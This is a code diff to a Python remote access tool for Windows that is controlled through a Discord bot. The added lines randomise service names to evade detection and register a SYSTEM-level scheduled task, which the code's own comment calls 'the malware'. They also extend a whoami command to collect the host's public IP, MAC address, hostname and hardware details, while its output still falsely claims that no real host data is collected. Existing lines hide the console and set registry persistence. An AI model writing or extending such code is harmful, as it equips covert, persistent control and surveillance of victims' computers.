@@ -22,6 +22,10 @@ import win32event
 import win32service
 import win32serviceutil
 import servicemanager
+import uuid
+import re
+import random
+import string
 
 TOKEN = "YOUR_TOKEN_HERE"
 GUILD_ID = 12121212121212121212  # <-- your server ID
@@ -43,15 +47,26 @@ def hide_console():
     hwnd = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
 
-def set_registry_for_persistence():
+def generate_random_string(length=10):
+    """Generate a random string of fixed length."""
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
+
+def set_registry_for_persistence(service_name):
     """Set registry to ensure the script runs on startup."""
     key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, win32con.KEY_ALL_ACCESS)
-    win32api.RegSetValueEx(key, 'DiscordBotService', 0, win32con.REG_SZ, sys.executable)
+    win32api.RegSetValueEx(key, service_name, 0, win32con.REG_SZ, sys.executable)
     win32api.RegCloseKey(key)
 
+def create_scheduled_task(service_name, delay_minutes=5):
+    """Create a scheduled task to run the malware with a delay."""
+    task_name = f"DiscordBotTask_{service_name}"
+    command = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc onstart /d {delay_minutes} /ru SYSTEM'
+    subprocess.run(command, shell=True, check=True)
+
 class BotService(win32serviceutil.ServiceFramework):
-    _svc_name_ = "DiscordBotService"
-    _svc_display_name_ = "Discord Bot Service"
+    _svc_name_ = generate_random_string()
+    _svc_display_name_ = f"Discord Bot Service {_svc_name_}"
     _svc_description_ = "A service to run the Discord bot in the background."
 
     def __init__(self, args):
@@ -214,7 +229,7 @@ async def download(interaction: discord.Interaction, file_path: str):
             f.write(response.content)
         await interaction.response.send_message(f"File has been downloaded and saved to {file_path}.")
     except requests.RequestException as e:
-                await interaction.response.send_message(f"Failed to download file: {str(e)}")
+        await interaction.response.send_message(f"Failed to download file: {str(e)}")
 
 @bot.tree.command(name="screenshot", description="Take a screenshot and upload it", guild=discord.Object(id=GUILD_ID))
 async def screenshot(interaction: discord.Interaction):
@@ -275,10 +290,37 @@ async def latency_check(interaction: discord.Interaction):
 
 @bot.tree.command(name="whoami", description="Simulated host & user info", guild=discord.Object(id=GUILD_ID))
 async def whoami(interaction: discord.Interaction):
+    # Get the public IP address
+    public_ip = requests.get('https://api.ipify.org').text
+
+    # Get the local IP address
+    local_ip = socket.gethostbyname(socket.gethostname())
+
+    # Get the MAC address
+    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+
+    # Get the hostname
+    hostname = socket.gethostname()
+
+    # Get the OS version
+    os_version = platform.version()
+
+    # Get the system architecture
+    system_architecture = platform.architecture()
+
+    # Get the processor information
+    processor_info = platform.processor()
+
     msg = (
         f"👤 User: `{interaction.user}`\n"
-        f"🖥 OS (simulated): `{platform.system()}`\n"
+        f"🖥 OS: `{platform.system()} {os_version}`\n"
+        f"💻 Hostname: `{hostname}`\n"
+        f"🌐 Public IP: `{public_ip}`\n"
+        f"🏠 Local IP: `{local_ip}`\n"
+        f"📡 MAC Address: `{mac_address}`\n"
         f"🐍 Python: `{platform.python_version()}`\n"
+        f"💻 Architecture: `{system_architecture}`\n"
+        f"💼 Processor: `{processor_info}`\n"
         f"⏱ Time: `{datetime.utcnow()} UTC`\n\n"
         "⚠️ Simulation mode — no real host data collected"
     )
@@ -351,5 +393,7 @@ async def ctfhelp(interaction: discord.Interaction):
 
 if __name__ == '__main__':
     hide_console()
-    set_registry_for_persistence()
+    service_name = generate_random_string()
+    set_registry_for_persistence(service_name)
+    create_scheduled_task(service_name, delay_minutes=5)
     win32serviceutil.HandleCommandLine(BotService)
